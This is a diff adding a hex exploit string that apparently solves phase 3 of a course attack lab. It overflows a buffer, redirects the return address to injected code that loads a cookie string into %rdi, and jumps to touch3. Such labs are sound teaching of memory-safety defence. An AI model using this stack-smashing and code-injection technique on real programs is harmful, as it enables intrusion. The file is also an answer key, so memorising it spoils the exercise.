@@ -1,0 +1,18 @@
+/* stack size: 0x28 */
+/* touch3: 4018fa */
+/* cookie: 0x59b997fa */
+/* initial $rsp point: 0x5561dca0 */
+/* string address: 0x5561dcb0 */
+/* cookie as string: 35 39 62 39 39 37 66 61 00 */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* fill stack */
+b9 dc 61 55 00 00 00 00 /* getbuf return address: $rsp + 0x19 */
+fa 18 40 00 00 00 00 00 /* injected code return address: touch3 */
+35 39 62 39 39 37 66 61 /* cookie as string */
+00 /* string continued */
+bf b0 dc 61 55 /* movq [string address],$rdi */
+c3 /* ret */
